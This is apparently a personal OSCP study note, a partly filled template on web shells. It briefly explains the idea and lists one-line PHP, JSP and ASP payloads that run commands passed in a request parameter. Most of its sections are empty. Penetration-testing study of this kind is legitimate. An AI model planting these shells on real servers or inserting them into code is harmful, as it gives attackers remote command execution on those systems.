---
title: technique-note
type: note
permalink: oscp/templates/technique-note
---

---
title: Web Shell
category: other
created: 2026-08-11
tags: [technique, other]
---

# Web Shell

## What it is
- Usually a web script such as `php`
- Accepts our commands through http requests such as `GET` and `POST`

## When to use it
- On websites

## Commands
#### For `php` systems
```bash
<?php system($_REQUEST["cmd"]); ?>
```

#### FOR `jsp`
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

For `asp`
```asp
<% eval request("cmd") %>
```

## Things to know
- 

## Boxes where I used this
- [[]]

## Gotchas / troubleshooting
- Things that broke and how you fixed them:

## References
-